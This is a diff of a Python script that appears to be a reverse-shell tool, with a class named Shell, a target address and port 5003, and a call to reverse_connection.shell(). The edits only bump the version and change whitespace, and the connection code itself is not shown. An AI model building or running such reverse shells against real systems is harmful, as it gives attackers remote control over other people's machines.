@@ -3,13 +3,12 @@
 from subprocess import run
 import os
 
-
 # # # # # # # # # # # # # # # # # # # # # #
 #                                         #
 #   Author  :   Keyj33k                   #
 #   Contact :   nomotikag33n@gmail.com    #
 #   Github  :   @keyj33k                  #
-#   Version :   1.0.4                     #
+#   Version :   1.0.5                     #
 #                                         #
 # # # # # # # # # # # # # # # # # # # # # #
 
@@ -20,6 +19,7 @@ class Shell:
             target_address,
             target_port
     ):  # assign the target address and the target port
+        
         self.target_address = target_address
         self.target_port = target_port
 
@@ -79,6 +79,7 @@ if __name__ == "__main__":
             5003
         )
     )  # define target ip address and target port
+    
     reverse_connection.shell()
 
     
